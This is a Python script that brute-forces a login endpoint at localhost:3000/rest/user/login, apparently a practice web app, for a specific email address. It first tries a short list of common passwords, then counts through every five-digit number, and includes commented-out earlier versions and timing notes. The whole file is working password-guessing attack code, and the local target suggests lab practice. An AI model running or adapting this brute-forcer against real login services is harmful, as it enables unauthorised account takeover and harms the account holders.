#!/usr/bin/python3
import requests
# import random
user = "doddtastic@gmail.com"
# passwrd = "12345"
pass_int = 0
pass_attempt = '00000'

# Use word list to check common passwords before brute force
common_pass = [
    "12345",
    "11111",
    "22222",
    "33333",
    "44444",
    "55555",
    "66666",
    "77777",
    "88888",
    "99999",
    "00000",
    "54321",
    "56789"
]
# while True:
#    r = requests.post(
#        "http://localhost:3000/rest/user/login",
#        data = {"email": user, "password": pass_attempt})
#    if r.status_code == 200:
#        print("Your password is:", pass_attempt)
#        break
#    pass_int += 1
#    pass_attempt = str(pass_int).zfill(5)
# TIME: 1m21s
# PROBLEMS: single threaded
# while r.status_code != 200:
#    ran_attempt = random.randrange(0, 99999)
#    pass_attempt = str(ran_attempt).zfill(5)
#    #print(pass_attempt)
# TIME: UNKOWN
# PROBLEMS: MANY


def login_attempt(pass_attempt):
    r = requests.post(
        "http://localhost:3000/rest/user/login",
        data={"email": user, "password": pass_attempt}
    )
    return r


def brute_force(pass_int, pass_attempt):
    while login_attempt(pass_attempt).status_code != 200:
        pass_int += 1
        pass_attempt = str(pass_int).zfill(5)
        print(pass_attempt)
    print("Your password is:", pass_attempt)


def word_list_check():
    for word in common_pass:
        if login_attempt(word).status_code == 200:
            print("Your password is:", word)
            break


word_list_check()
brute_force(pass_int, pass_attempt)
# TIME: 1m21s
